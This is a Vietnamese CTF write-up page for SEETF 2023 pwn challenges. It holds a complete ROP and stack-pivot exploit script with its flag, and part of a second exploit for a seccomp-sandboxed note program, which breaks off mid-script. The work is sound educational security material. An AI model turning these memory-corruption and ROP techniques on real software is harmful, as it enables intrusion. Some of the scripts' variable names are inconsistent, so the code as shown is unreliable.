@@ -1,0 +1,605 @@
+<!DOCTYPE html>
+<html class="" lang="en-us"><head>
+    
+    <meta name="viewport" content="width=device-width" />
+    <meta http-equiv="Content-Type" content="text/html;charset=UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=7" />
+
+    <link
+    rel="icon"
+    href='/favicon.png'
+/>
+<link
+    rel="shortcut icon"
+    href='/favicon.ico'
+    type="image/x-icon"
+/>
+<link
+    rel="apple-touch-icon"
+    href='/apple-touch-icon.png'
+/>
+
+    <link
+        rel="icon"
+        href='/logo.svg'
+        type="image/svg+xml"
+    />
+
+<title>
+        
+            SEETF 2023 Writeups  &ndash;
+        
+        w1n-gl0ry&#39;s
+    </title>
+
+    
+    <link href="/symbols-nerd-font/symbols-nerd-font.css" rel="stylesheet" integrity="sha512-lydow8GLOLlYNOtHlksNCmGWWCBsbIEtikXpHzfWqx78HLlyQZHOzyLwPpKol4Th6aCwLUXOfODVYgwrd3nwKQ=="/>
+    <link href="/jetbrains-mono/jetbrains-mono.css" rel="stylesheet" integrity="sha512-tJxlgL6v1Y7kFf+qB8SloaAMKnOAw6WouknxXtIjkBux9Y/9aX81EUWOJO8c/3l98DmjG8brr4to7zaez606Fg=="/>
+
+    
+    
+    <link type="text/css" rel="stylesheet" href=https://w1n-gl0ry.github.io/css/styles.abbd6311bb4b6ca58f8e7398140529245ae0f6428b759fcd830742eee2619eabb900ba9914a9affb82aa9a16a9b9ea727bb315315a976a0db0e7513a5f12c504.css integrity="sha512-q71jEbtLbKWPjnOYFAUpJFrg9kKLdZ/NgwdC7uJhnqu5ALqZFKmv&#43;4Kqmhapuepye7MVMVqXag2w51E6XxLFBA==" />
+<meta name="author" content="botton" />
+
+    
+        <meta name="keywords" content='ctf, pwn' />
+    
+    
+        <meta name="description" content="SEETF 2023 Writeups" />
+    
+
+<meta property="og:site_name"
+    content='w1n-gl0ry&#39;s' />
+
+    <meta property="og:title" content="SEETF 2023 Writeups" />
+    <meta property="og:type" content="article" />
+    
+    <meta
+        property="article:author" content="botton" />
+    <meta
+        property="article:published_time"
+        content='2023-06-12T17:37:11Z&#43;0800' />
+    
+        
+            <meta property="article:tag" content="ctf" />
+        
+            <meta property="article:tag" content="pwn" />
+        
+    
+    <meta property="og:url" content="https://w1n-gl0ry.github.io/posts/seetf-2023/" />
+    
+    
+    <meta property="og:image"
+        content="https://w1n-gl0ry.github.io/icon512.png" />
+    
+        <meta property="og:description" content="SEETF 2023 Writeups" />
+    
+
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:domain"
+      content='w1n-gl0ry.github.io'
+/>
+<meta property="twitter:url" content="https://w1n-gl0ry.github.io/posts/seetf-2023/" />
+
+
+    <meta name="twitter:title" content="SEETF 2023 Writeups" />
+    
+    
+    
+    <meta name="twitter:image"
+        content="https://w1n-gl0ry.github.io/icon512.png" />
+    
+        <meta name="twitter:description" content="SEETF 2023 Writeups" />
+    
+
+<link rel="manifest" href="/manifest/index.json" />
+</head>
+
+
+<body>
+        <div id="baseContainer"><header class="">
+<div class="titleAndSearchContainer">
+        <div id="titleContainer">
+            
+                <a class="unstyledLink" href="/">
+                    <img src='/logo.svg' alt='Logo'/>
+                </a>
+            
+            <div class="rightOfLogo">
+                <div class="titleAndHamburger">
+                    <h1>
+                        <a class="unstyledLink" href="/">w1n-gl0ry&#39;s</a>
+                        
+                    </h1>
+                    
+                </div>
+                <div id="wide_nav"><nav>
+    
+    <ul id="main-nav">
+        <li><a href="/">Home</a></li>
+        
+            <li><a href="/posts/">Posts</a></li>
+        
+        
+        
+        
+        
+        
+            <li><a href="https://w1n-gl0ry.github.io/about/aboutme/">About</a></li>
+        
+        
+            <li><a href="/tags/">Tags</a></li>
+        
+        
+    </ul>
+</nav>
+</div>
+            </div>
+        </div>
+        <div class="search">
+    <input id="searchbar" type="text" placeholder='Search' />
+    <span class="nerdlink" onclick="newSearch();">&#xf002;</span>
+</div>
+<script>
+    function newSearch() {
+        let term = searchbar.value.trim();
+        if (!term) return;
+        location.href = `/search/?q=${term}`;
+    }
+    searchbar.onkeyup = (ev) => {if (ev.keyCode == 13) newSearch()};
+</script>
+
+    </div>
+    <div id="links">
+        <a
+    
+        rel="noreferrer"
+    
+    target="_blank"
+    class="nerdlink"
+    href="/index.xml">
+    
+    
+        &#xf09e;
+    
+    <span>
+        RSS
+    </span>
+</a>
+
+        
+        <a
+    
+        rel="noreferrer"
+    
+    target="_blank"
+    class="nerdlink"
+    href="https://github.com/w1n-gl0ry">
+    
+    
+        &#xf09b;
+    
+    <span>
+        GitHab
+    </span>
+</a>
+<a
+    
+        rel="noreferrer"
+    
+    target="_blank"
+    class="nerdlink"
+    href="https://twitter.com/botton3310">
+    
+    
+        &#xf099;
+    
+    <span>
+        Titter
+    </span>
+</a>
+
+    </div>
+    
+
+</header>
+<div id="contentContainer">
+                <div id="content">
+                    <main>
+<article class="card single">
+    
+        <h1>SEETF 2023 Writeups</h1>
+    
+    
+        <p class="date">
+            <span title='Date'> </span>
+    2023-06-12
+
+</p>
+    
+    
+    
+    <div class="articleToc">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#great---expectations">Great - Expectations</a></li>
+    <li><a href="#mmap-note">Mmap note</a></li>
+    <li><a href="#shellcode-as-a-service">Shellcode As A Service</a></li>
+  </ul>
+</nav>
+    <hr />
+</div>
+
+    <div><h1 id="great---expectations">Great - Expectations</h1>
+<p><code>Description: Ask no questions, and you'll be told no lies. </code></p>
+<p>Ở bài này, trong hàm <code>input_floats()</code> có khai báo mảng buf kiểu char với (3 bytes), nhưng có lỗi khi format nhập vào là %f (4 bytes), nên từ 3 lần ghi đề cho, ta có thể đè nhiều nhất 3 bytes xuống canary (kí tự &lsquo;A&rsquo;) và 2 bytes của saved_rbp của hàm main. Vì vậy, í tưởng ở đây là ta ghi đè 1 byte (hoặc 2 bytes) của saved_rbp để khiến cho ret trỏ tới chuỗi mà ta mong muốn. Đầu chương trình cho ta nhập nhiều nhất 0x107 kí tự, nên ta có thể pivot stack đến đó, để khiến ret trỏ tới chuỗi payload mà ta muốn.
+Để không phải leak libc rồi quay lại hàm main 1 lần nữa thì vì chúng ta có thể ghi đè lên bảng GOT nên ý tưởng của em là dùng ROP để thay đổi địa chỉ của hàm nào đó về one_gadgets, vì offset giữa 2 hàm trong libc luôn cố định nên ta có thể dùng gadget <code>add dword ptr [rbp - 0x3d], ebx ; nop ; ret</code> để cộng/trừ offset sao cho địa chỉ đó trỏ tới one_gadget</p>
+<p>Ta thấy nửa byte đầu của bytes thứ 2 sau LSB của saved_rbp chỉ cách 1 đơn vị so với địa chỉ của buffer mà chương trình cho ta nhập vào. Hơn nữa, byte cuối luôn kết thúc bằng 0x00, 0x10, &hellip;, 0xf0 . Nên ta có cơ hội 1/16 để pivot stack về buffer, xong cộng 1 để bypass check [rbp-1] với A.</p>
+<p><strong>Solve scripts</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python3" data-lang="python3"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>local <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>debug <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;amd64&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># context.aslr = False</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;debug&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;, &#39;-F&#39; &#39;#{pane_pid}&#39;, &#39;-P&#39;]</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># context.timeout = 2</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">riconn</span>():
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">global</span> local
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">global</span> debug
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> arg <span style="color:#f92672">in</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>:]:
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> arg <span style="color:#f92672">in</span> (<span style="color:#e6db74">&#39;-l&#39;</span>, <span style="color:#e6db74">&#39;--local&#39;</span>):
+</span></span><span style="display:flex;"><span>			local <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> arg <span style="color:#f92672">in</span> (<span style="color:#e6db74">&#39;-d&#39;</span>, <span style="color:#e6db74">&#39;--debug&#39;</span>):
+</span></span><span style="display:flex;"><span>			debug <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> local:
+</span></span><span style="display:flex;"><span>		io <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./chall_patched&#39;</span>)
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> debug:
+</span></span><span style="display:flex;"><span>			gdb<span style="color:#f92672">.</span>attach(s, gdbscript<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            b* 0x00000000004012ae
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            b* 0x00000000004011fc
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            c
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">			&#39;&#39;&#39;</span>)
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">pass</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>		io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;win.the.seetf.sg&#39;</span>, <span style="color:#ae81ff">2004</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> io
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./chall_patched&#39;</span>)
+</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;libc.so.6&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pop_rdi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000401313</span>
+</span></span><span style="display:flex;"><span>pop_rsi_r15 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000401311</span>
+</span></span><span style="display:flex;"><span>leave_ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x000000000040122c</span>
+</span></span><span style="display:flex;"><span>pop_rbp <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x000000000040119d</span>
+</span></span><span style="display:flex;"><span>ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x000000000040101a</span>
+</span></span><span style="display:flex;"><span>main <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x000000000040122e</span>
+</span></span><span style="display:flex;"><span>main_no_push <span style="color:#f92672">=</span> main<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>input_floats <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000004011b6</span>
+</span></span><span style="display:flex;"><span>put_gots <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x404018</span>
+</span></span><span style="display:flex;"><span>csu <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x40130a</span>
+</span></span><span style="display:flex;"><span>add_what_where <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x000000000040119c</span> <span style="color:#75715e"># add dword ptr [rbp - 0x3d], ebx ; nop ; ret</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">hex_to_float</span>(hex_str):
+</span></span><span style="display:flex;"><span>    binary_str <span style="color:#f92672">=</span> bytes<span style="color:#f92672">.</span>fromhex(hex_str)
+</span></span><span style="display:flex;"><span>    unpacked <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>unpack(<span style="color:#e6db74">&#39;!f&#39;</span>, binary_str)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> unpacked[<span style="color:#ae81ff">0</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>	io <span style="color:#f92672">=</span> riconn()
+</span></span><span style="display:flex;"><span>	payload <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x61</span><span style="color:#f92672">*</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span><span style="color:#f92672">*</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">+</span> p64(csu) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x5f6de</span>) <span style="color:#f92672">+</span> p64(put_gots<span style="color:#f92672">+</span><span style="color:#ae81ff">0x3d</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">4</span> <span style="color:#f92672">+</span> p64(add_what_where) <span style="color:#f92672">+</span> p64(elf<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;puts&#39;</span>])
+</span></span><span style="display:flex;"><span>	value <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;3.544850151698461e-38&#39;</span>
+</span></span><span style="display:flex;"><span>	io<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;ale.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>,payload)
+</span></span><span style="display:flex;"><span>	io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;number!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
+</span></span><span style="display:flex;"><span>	io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;number!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, value<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>	io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;number!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;+&#39;</span>)	
+</span></span><span style="display:flex;"><span>	io<span style="color:#f92672">.</span>interactive()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span>:
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>close()
+</span></span></code></pre></div><p><strong>$ flag:</strong> SEE{Im_f33ling_1ucky_e27e006fe918ab56}</p>
+<h1 id="mmap-note">Mmap note</h1>
+<p><code>Description: I made a basic note program but with sandbox. And no more chunk for house of xxx. Can you still get the flag?</code></p>
+<p>Ở bài này, chúng ta có thể allocate 1 số chunks với size 0x1000. Nếu phân bổ hết lượng bộ nhớ trên Heap và khiến cho chunks mới phải dùng mmaped(). Điều đó khiến ta có 1 số chunk nằm trên Thread Local Storage (TLS) được đặt với 1 offset không đổi so với libc trong vùng nhớ.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span> <span style="color:#a6e22e">write_0</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> v1; <span style="color:#75715e">// [rsp+4h] [rbp-Ch] BYREF
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> v2; <span style="color:#75715e">// [rsp+8h] [rbp-8h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  v2 <span style="color:#f92672">=</span> __readfsqword(<span style="color:#ae81ff">0x28u</span>);
+</span></span><span style="display:flex;"><span>  v1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  printf(<span style="color:#e6db74">&#34;idx = &#34;</span>);
+</span></span><span style="display:flex;"><span>  __isoc99_scanf(<span style="color:#e6db74">&#34;%d&#34;</span>, <span style="color:#f92672">&amp;</span>v1);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( v1 <span style="color:#f92672">&lt;</span> dword_404590 )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;size to write = &#34;</span>);
+</span></span><span style="display:flex;"><span>    __isoc99_scanf(<span style="color:#e6db74">&#34;%d&#34;</span>, <span style="color:#f92672">&amp;</span>sizes[v1]);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( sizes[v1] <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">4096</span> )
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      read(<span style="color:#ae81ff">0</span>, (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)chunk[v1], sizes[v1]);
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1LL</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      puts(<span style="color:#e6db74">&#34;too much&#34;</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0LL</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    puts(<span style="color:#e6db74">&#34;invalid idx&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0LL</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Lỗi thứ 2 ở hàm write(), ta thấy lỗi integer overflow, nên chúng ta có thể đọc nhiều hơn 0x1000 bytes. Điều này cho phép ta có thể đọc được cả canary được lưu giữ trong 1 offset cố định trên TLS (vì hàm write in ra cả nullbyte).
+Sau đó, chúng ta dùng để dùng rop chain open-&gt;read-&gt;write để ánh xạ file flag vào bộ nhớ chương trình và xuất nó ra thiết bị xuất chuẩn.</p>
+<p>OOPs, chúng ta lại không có read() để đọc file vào bộ nhớ (vì chương trình đã dùng seccomp để chặn các hàm đó lại). May mắn thay, em tìm thấy bài viết này <a href="https://stackoverflow.com/questions/74743307/mmap-open-and-read-from-file">link</a>. Dùng mmap() để read() file. Ok, vậy mọi thứ đã rõ ràng rồi, mình tiến hành exploit:</p>
+<p><strong>Solve scripts</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python3" data-lang="python3"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> ctypes <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>local <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>debug <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;amd64&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># context.aslr = False</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># context.log_level = &#39;debug&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;, &#39;-F&#39; &#39;#{pane_pid}&#39;, &#39;-P&#39;]</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># context.timeout = 2</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">riconn</span>():
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">global</span> local
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">global</span> debug
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> arg <span style="color:#f92672">in</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>:]:
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> arg <span style="color:#f92672">in</span> (<span style="color:#e6db74">&#39;-l&#39;</span>, <span style="color:#e6db74">&#39;--local&#39;</span>):
+</span></span><span style="display:flex;"><span>			local <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> arg <span style="color:#f92672">in</span> (<span style="color:#e6db74">&#39;-d&#39;</span>, <span style="color:#e6db74">&#39;--debug&#39;</span>):
+</span></span><span style="display:flex;"><span>			debug <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> local:
+</span></span><span style="display:flex;"><span>		io <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./chall_patched&#39;</span>)
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> debug:
+</span></span><span style="display:flex;"><span>			gdb<span style="color:#f92672">.</span>attach(s, gdbscript<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            b* 0x0000000000401930
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            b* 0x0000000000401953
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            continue
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">			&#39;&#39;&#39;</span>)
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>			raw_input(<span style="color:#e6db74">&#39;DEBUG&#39;</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>		io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;win.the.seetf.sg&#39;</span>, <span style="color:#ae81ff">2002</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> io
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> conn()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./chall_patched&#39;</span>)
+</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;libc.so.6&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pop_rax <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000401491</span>
+</span></span><span style="display:flex;"><span>pop_rdi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x000000000040148f</span>
+</span></span><span style="display:flex;"><span>pop_rsi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000401493</span>
+</span></span><span style="display:flex;"><span>pop_rsp <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000004014a0</span>
+</span></span><span style="display:flex;"><span>pop_r10 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000401497</span>
+</span></span><span style="display:flex;"><span>pop_r8 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x000000000040149a</span>
+</span></span><span style="display:flex;"><span>pop_r9 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x000000000040149d</span>
+</span></span><span style="display:flex;"><span>pop_rdx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000401495</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sys_call <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000004014a8</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Stage 1 : Leak canary and Libc :</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">create_note</span>():
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">write_note</span>(idx, size<span style="color:#f92672">=</span><span style="color:#ae81ff">0x1000</span>):
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;idx = &#39;</span>, str(idx)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;size to write = &#39;</span>, <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>size<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">read_note</span>(idx):
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;3&#39;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;idx = &#39;</span>, str(idx)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">30</span>):
+</span></span><span style="display:flex;"><span>    create_note()
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> i <span style="color:#f92672">==</span><span style="color:#ae81ff">0</span>:
+</span></span><span style="display:flex;"><span>        p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Addr of note 0 is 0x&#34;</span>)
+</span></span><span style="display:flex;"><span>        addr_0<span style="color:#f92672">=</span>int(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)<span style="color:#f92672">.</span>rstrip()<span style="color:#f92672">.</span>decode(),<span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>    sleep(<span style="color:#ae81ff">0.1</span>)
+</span></span><span style="display:flex;"><span>
